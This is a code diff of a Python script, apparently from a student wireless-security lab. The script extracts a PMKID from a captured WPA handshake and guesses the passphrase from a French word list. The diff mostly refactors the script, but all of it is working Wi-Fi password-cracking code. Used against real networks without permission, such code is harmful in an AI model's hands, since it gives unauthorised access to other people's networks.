@@ -59,9 +59,6 @@ def catch4WayHandshake(ap_mac, sta_mac, packets):
     '''
 
     EAPOL_ANONCE = 138  # EAPOL-Key1(ANonce)
-    EAPOL_SNONCE_MIC = 266  # EAPOL-Key2(SNonce+MIC)
-    EAPOL_GTK_MIC = 5066  # EAPOL-Key3(GTK+MIC)
-    EAPOL_ACK = 778  # EAPOL-Key4(ACK)
 
     for packet in packets:
         dst_mac = packet.addr1.replace(':', '')
@@ -72,6 +69,7 @@ def catch4WayHandshake(ap_mac, sta_mac, packets):
             # EAPOL-Key1(ANonce) / AP -> STA
             if (wpa_key.key_info == EAPOL_ANONCE) \
             and (dst_mac == sta_mac):
+                #retourne la pmkid
                 return (b2a_hex(wpa_key.wpa_key).decode('UTF-8'))[12:]
     
     return None
@@ -86,11 +84,12 @@ def tryPmkid(passphrase, ssid, ap_mac, sta_mac):
     pmkid = b2a_hex(hmac.new(pmk, pmk_data, hashlib.sha1).digest()[:16]).decode('UTF-8')
     return pmkid
 
-def bruteForcePassphrase(ssid, APmac, Clientmac, pmkid):
-    '''
-    Try to found a WPA passphrase from a PMKID with a word list
-    '''
-    dico = open('liste_francais.txt', 'r')
+'''
+Try to found a WPA passphrase from a PMKID with a word list
+'''
+def bruteForcePassphrase(ssid, APmac, Clientmac, pmkid, pathList):
+
+    dico = open(pathList, 'r')
     for line in dico.readlines():
         for word in line.split():
             if pmkid == tryPmkid(word, ssid, APmac, Clientmac):
@@ -101,14 +100,14 @@ def bruteForcePassphrase(ssid, APmac, Clientmac, pmkid):
 wpa=rdpcap("PMKID_handshake.pcap")
 ssid, APmac, Clientmac = catchAssociationRequest(wpa)
 pmkid = catch4WayHandshake(APmac, Clientmac, wpa)
-passphrase = bruteForcePassphrase(ssid, APmac, Clientmac, pmkid)
+passphrase = bruteForcePassphrase(ssid, APmac, Clientmac, pmkid, 'liste_francais.txt')
 
 print ("\nBrute force attack")
 print ("============================")
-print ("SSID:\t\t",ssid)
-print ("AP Mac:\t\t",APmac)
-print ("Client Mac:\t",Clientmac)
-print ("PMKID:\t\t",pmkid)
+print ("SSID:\t\t", ssid)
+print ("AP Mac:\t\t", APmac)
+print ("Client Mac:\t", Clientmac)
+print ("PMKID:\t\t", pmkid)
 print ("Passphrase:\t", passphrase, "\n")
 
 
